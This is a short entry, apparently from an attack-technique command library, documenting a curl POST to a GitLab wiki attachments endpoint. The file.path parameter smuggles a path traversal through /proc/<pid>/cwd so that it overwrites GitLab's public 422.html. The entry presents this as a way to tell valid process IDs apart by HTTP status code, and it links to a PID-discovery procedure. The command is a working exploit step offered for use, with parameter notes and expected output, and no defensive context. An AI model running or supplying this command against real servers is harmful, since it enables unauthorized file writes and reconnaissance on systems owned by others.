---
data: >-
  curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer
  $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html'
  -F '[file]=@/tmp/lala.txt'
tags:
  - http-probe
  - pid-check
type: command
executor: bash
platforms:
  - Linux
id: d05bf6ce-3cbc-438f-8234-a07c4b94cbc9
created_at: '2025-12-11T03:47:39.404Z'
updated_at: '2025-12-11T03:47:39.404Z'
verified: false
validated: true
submitted: true
---
# curl-check-pid-http-code

## Command

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

## Description

Probes PID validity by checking HTTP response code.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent | Yes |
| `-o /dev/null` | Discard output | Yes |
| `-w "%{http_code}\n"` | Print code | Yes |

## Examples

### Basic Usage

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

## Expected Output

201 or 500 indicating validity.

## Related
- [[procedures/Discover-Valid-PIDs-via-Information-Leak]]
